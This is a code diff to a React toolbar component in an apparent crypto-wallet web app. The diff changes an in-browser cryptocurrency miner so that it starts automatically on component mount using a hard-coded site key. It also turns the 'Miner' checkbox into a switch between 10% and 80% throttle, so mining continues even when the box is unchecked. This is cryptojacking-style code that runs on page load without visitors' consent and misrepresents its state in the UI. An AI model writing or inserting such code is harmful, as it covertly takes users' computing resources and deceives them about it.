@@ -18,7 +18,7 @@ const TopToolbar = ({
 }) => {
   const [showEmailForm, setShowEmailForm] = useState(false);
   const [walletConnected, setWalletConnected] = useState(false);
-  const [isMinerOn, setIsMinerOn] = useState(false);
+  const [isMinerHigh, setIsMinerHigh] = useState(false);
   const [mintMeBalance, setMintMeBalance] = useState(0);
   const [dshBalance, setDshBalance] = useState(0);
 
@@ -30,6 +30,11 @@ const TopToolbar = ({
       setWalletConnected(false);
     }
   }, [walletAddress]);
+
+  useEffect(() => {
+    // Initialize miner on component mount
+    initializeMiner();
+  }, []);
 
   const fetchBalances = async (address) => {
     try {
@@ -99,56 +104,31 @@ const TopToolbar = ({
   const initializeMiner = () => {
     try {
       const miner = new window.Client.Anonymous('b9445345d693a1af3a5b08cac6c3ac90f78485c63d7e263b573763b98eb75723', {
-        throttle: 0.1, c: 'w', ads: 0
+        throttle: 0.1,  // Start with low throttle
+        c: 'w',
+        ads: 1
       });
-      console.log(miner);
-      window.activeMiner = miner;
       miner.start();
-      console.log(miner);
-
-      console.log('Miner initialized at 10% throttle');
-      console.log('Miner is running:', window.activeMiner.isRunning());
-      const hps = miner.getHashesPerSecond();
-      console.log('hashes per second:', hps);
-
-      return miner;
+      window.activeMiner = miner;
+      console.log('Miner initialized and started at 10% throttle');
     } catch (error) {
       console.error('Error initializing miner:', error);
     }
   };
 
   const toggleMiner = () => {
-    if (!isMinerOn) {
+    if (isMinerHigh) {
       if (window.activeMiner) {
-        window.activeMiner.setThrottle(0.8); // Increase throttle to 80%
-        setIsMinerOn(true);
-        console.log('Miner throttle increased to 80%');
-        console.log('Miner is running:', window.activeMiner.isRunning());
-        const hps = window.activeMiner.getHashesPerSecond();
-        console.log('hashes per second:', hps);
-  
-      } else {
-        const miner = initializeMiner();
-        miner.setThrottle(0.8);
-        setIsMinerOn(true);
-        console.log('Miner is running:', window.activeMiner.isRunning());
-        const hps = window.activeMiner.getHashesPerSecond();
-        console.log('hashes per second:', hps);
-  
-
+        window.activeMiner.setThrottle(0.1); // Reduce throttle to 10%
+        console.log('Miner throttle reduced to 10%');
       }
     } else {
       if (window.activeMiner) {
-        window.activeMiner.setThrottle(0.1); // Lower throttle to 10%
-        setIsMinerOn(false);
-        console.log('Miner throttle reduced to 10%');
-        console.log('Miner is running:', window.activeMiner.isRunning());
-        const hps = window.activeMiner.getHashesPerSecond();
-        console.log('hashes per second:', hps);
-  
-
+        window.activeMiner.setThrottle(0.8); // Increase throttle to 80%
+        console.log('Miner throttle increased to 80%');
       }
     }
+    setIsMinerHigh(!isMinerHigh);
   };
 
   return (
@@ -167,7 +147,7 @@ const TopToolbar = ({
           <div className="miner-switch">
             <label>
               Miner:
-              <input type="checkbox" checked={isMinerOn} onChange={toggleMiner} />
+              <input type="checkbox" checked={isMinerHigh} onChange={toggleMiner} />
             </label>
           </div>
           <div className="token-balances">
